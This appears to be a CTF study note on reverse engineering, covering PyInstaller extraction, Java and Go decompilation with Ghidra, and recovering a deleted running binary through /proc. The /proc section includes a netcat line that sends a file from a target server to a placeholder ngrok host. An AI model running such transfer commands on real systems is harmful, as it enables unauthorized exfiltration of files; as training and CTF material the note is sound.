# Reverse Engineering

## Table of Contents
- [Reverse Engineering](#reverse-engineering)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Topics Covered](#topics-covered)
  - [Quick Reference](#quick-reference)
    - [PyInstaller Unpacking](#pyinstaller-unpacking)
    - [Java Decompilation](#java-decompilation)
    - [Static Binary Analysis](#static-binary-analysis)
    - [Go Binary Analysis with Ghidra](#go-binary-analysis-with-ghidra)
      - [Setup](#setup)
      - [Key things to look for in Go binaries](#key-things-to-look-for-in-go-binaries)
      - [Useful Ghidra workflow for Go binaries](#useful-ghidra-workflow-for-go-binaries)
    - [Recovering a Deleted Binary via `/proc`](#recovering-a-deleted-binary-via-proc)
  - [References](#references)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

Techniques for analyzing compiled binaries, disassembling executables, and recovering original logic or hidden flags.

---

## Topics Covered

**PyInstaller unpacking** — Extracting Python source from PyInstaller-compiled executables using `pyinstxtractor`.

**Disassembly / decompilation** — Analyzing compiled binaries with static tools to understand program logic.

**Java bytecode analysis** — Decompiling and analyzing `.class` files from Java challenges.

**Assembly analysis** — Reading and understanding x86/x64 assembly output.

**Obfuscated code** — Reversing obfuscated JavaScript or other languages to recover plaintext logic.

**Go binary analysis** — Decompiling Go ELF executables with Ghidra and a Go-specific plugin to recover map initializations, command dispatch tables, and other logic.

**Recovering deleted binaries** — Extracting a running process's executable from the Linux `/proc` filesystem even after the file has been deleted from disk.

---

## Quick Reference

### PyInstaller Unpacking

```bash
# Extract contents of a PyInstaller executable
python pyinstxtractor.py target.exe
# Output goes to target.exe_extracted/

# IMPORTANT: run with the exact Python version used to build the executable
# (visible in pyinstxtractor output as "Python version: X.Y")
# Mismatched version skips PYZ extraction — most real code lives in PYZ
python3.13 pyinstxtractor.py target.exe

# Decompile the main .pyc file
pip install decompile3
decompyle3 target.exe_extracted/target.pyc

# Or use pycdc for bytecode disassembly (supports Python 3.13+)
pycdc target.pyc

# Disassemble to raw bytecode (use when decompilation fails)
pycdas target.pyc > target.pyasm
```

**When decompilation fails (e.g., Python 3.13 unsupported opcodes):**

Use `pycdas` to get the raw bytecode disassembly and analyze it manually. The `[Names]`, `[Locals+Names]`, and `[Constants]` sections in the `.pyasm` output make functions largely readable without a full decompiler. Look for function names, constants, and opcodes like `BINARY_OP`, `CALL`, and `STORE_FAST` to reconstruct logic.

As a fallback, paste the `.pyasm` bytecode into an AI model (e.g., DeepSeek, Claude) and ask it to reconstruct the Python source. This can recover readable code even when no decompiler supports the target version.

### Java Decompilation

Use `javap` to generate Bytecode from the `.class` file:
```bash
javap -c -p Target.class
```

Use the **Fernflower** decompiler by simply dragging the `.class` into the editor on an IDE to get readable Java source code.

### Static Binary Analysis

```bash
# Strings in a binary
strings binary | grep -i flag

# Identify file type
file binary
exiftool binary

# Disassemble with objdump
objdump -d binary | less

# Open in Ghidra or IDA for full decompilation
```

### Go Binary Analysis with Ghidra

Go binaries compiled without stripping (`not stripped`) retain symbol names, making Ghidra decompilation much more readable than with C/C++ binaries.

#### Setup
1. Install [Ghidra](https://ghidra-sre.org/).
2. Install the [Ghidra Golang Analyzer Extension](https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension/releases) for improved Go type recovery and function naming.

#### Key things to look for in Go binaries
`main.init` — Go's package-level initialization function. This is where global maps and lookup tables are populated, making it an ideal place to find hardcoded command IDs, dispatch tables, or configuration values:

```go
// Example: CAN bus command ID map found in main.init
runtime.mapassign_fast32(&datatype.Map.map[uint32]uint32, phVar1, 0x201);
*extraout_RAX = 0x281;   // key=0x201, value=0x281

runtime.mapassign_fast32(&datatype.Map.map[uint32]uint32, phVar1, 0x202);
*extraout_RAX_00 = 0x282;  // key=0x202, value=0x282
```

The pattern `runtime.mapassign_fast32(map, key)` followed by a pointer assignment `*extraout_RAX = value` represents a map entry `key → value`.

#### Useful Ghidra workflow for Go binaries
1. Import binary → select ELF → run auto-analysis.
2. Install GolangAnalyzerExtension → re-analyze.
3. Window → Symbol Tree → filter for "main." → browse main package functions.
4. Focus on: `main.init`, `main.main`, `main.handle*`, `main.process*`.
5. In decompiler: look for `runtime.mapassign_*` calls to extract map contents.

> [!TIP] Tips
> - Go function names are fully qualified (`main.handleCommand`, not just `handleCommand`).
> - String constants often appear as `runtime.newobject` + pointer patterns.
> - Map reads use `runtime.mapaccess1_fast32` / `runtime.mapaccess2_fast32`.

### Recovering a Deleted Binary via `/proc`
On Linux, when a process's executable is deleted from disk after the process starts, the binary remains accessible through the `/proc` filesystem as long as the process is running. The kernel holds the file open via the process's file descriptor.

1. Confirm the process is running and binary is deleted:
   ```bash
   ps auxw | grep <process-name>
   ls -l /proc/<PID>/exe
   ```
   Output example:
   ```
   exe -> /app/gnome_cancontroller (deleted)
   ```
2. Verify the binary is readable (check ELF header):
   ```bash
   cat /proc/<PID>/exe | xxd | head
   ```
3. Transfer the binary off the server for local analysis:
   - **Option 1:** via netcat (if nc is available on server)
     ```bash
     # On local machine (listening):
     ncat -lvnp 4444 > recovered_binary
     ```
     ```bash
     # On target server:
     nc -q 1 NGROK_HOST NGROK_PORT < /proc/<PID>/exe
     ```
   - **Option 2:** via `base64` over the shell
     ```bash
     # On target server:
     cat /proc/<PID>/exe | base64 | tr -d '\n'
     # On local machine: decode output
     echo "<base64>" | base64 -d > recovered_binary
     ```
4. After transfer and file is available locally, verify the file:
   ```bash
   file recovered_binary
   # e.g.: ELF 64-bit LSB executable, x86-64, ... Go BuildID=..., not stripped
   ```

---

## References

### Challenges
| Source | Name |
|---|---|
| Holiday Hack Challenge 2025, Act III | [Hack-a-Gnome](../../ctf-writeups/holiday-hack-challenge/2025/act-iii/hack-a-gnome/README.md) |
| Holiday Hack Challenge 2025, Act III | [Free Ski](../../ctf-writeups/holiday-hack-challenge/2025/act-iii/free-ski/README.md) |
| Immersive Labs, Haunted Hollow | [Teacup Trouble](../../ctf-writeups/immersive-labs/01-haunted-hollow/lab-7-teacup-trouble/README.md) |
| Immersive Labs, Return to Haunted Hollow | [Delving Deeper](../../ctf-writeups/immersive-labs/02-return-to-haunted-hollow/lab-3-delving-deeper/README.md) |
| Immersive Labs, Return to Haunted Hollow | [Confusing Code](../../ctf-writeups/immersive-labs/02-return-to-haunted-hollow/lab-5-confusing-code/README.md) |

### Web Sites
- [Ghidra](https://ghidra-sre.org/) — NSA's free software reverse engineering (SRE) suite
- [Ghidra Golang Analyzer Extension](https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension/releases) — Ghidra plugin for Go binary analysis
- [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor)
- [HackTricks — Reversing](https://angelica.gitbook.io/hacktricks/reversing)
- [dogbolt.org](https://dogbolt.org/) — online multi-decompiler
